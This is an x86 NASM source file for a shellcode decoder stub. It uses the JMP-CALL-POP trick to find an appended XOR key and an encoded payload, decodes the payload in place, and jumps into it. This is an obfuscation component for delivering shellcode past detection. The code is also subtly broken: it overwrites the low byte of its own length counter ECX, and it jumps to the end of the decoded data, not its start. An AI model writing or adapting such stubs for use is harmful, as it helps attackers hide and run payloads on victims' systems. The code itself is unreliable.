
; JMP-CALL-POP Multi-byte XOR decoder stub
; This stub will be prepended to the encoded shellcode.
; The XOR key (4 bytes) and encoded shellcode length (4 bytes) will immediately follow the 'call decoder' instruction.

BITS 32

%define NULL_FREE_LENGTH_XOR_KEY 0x11223344

_start:
    jmp short call_decoder

decoder:
    pop esi             ; ESI = address of XOR key and encoded length
    mov ebx, dword [esi] ; Load 4-byte key into EBX
    mov ecx, dword [esi+4] ; Load encoded shellcode length into ECX
    xor ecx, NULL_FREE_LENGTH_XOR_KEY ; Decode actual length
    add esi, 8          ; ESI = start of actual encoded shellcode

    xor edx, edx        ; EDX = 0 (counter for key bytes)

decode_loop:
    mov eax, ebx        ; Copy key to EAX
    mov cl, dl          ; CL = DL (current key byte index)
    shl cl, 3           ; CL = DL * 8
    shr eax, cl         ; Shift right by (dl * 8) bits

    xor byte [esi], al  ; XOR current shellcode byte with AL
    inc esi             ; Move to next shellcode byte
    inc edx             ; Increment key byte counter
    and edx, 0x03       ; EDX = EDX % 4 (to cycle through 4-byte key)
    dec ecx             ; Decrement shellcode length counter
    jnz decode_loop     ; Loop until all bytes are decoded

    jmp esi             ; Jump to decoded shellcode

call_decoder:
    call decoder
    ; Encoded shellcode follows here
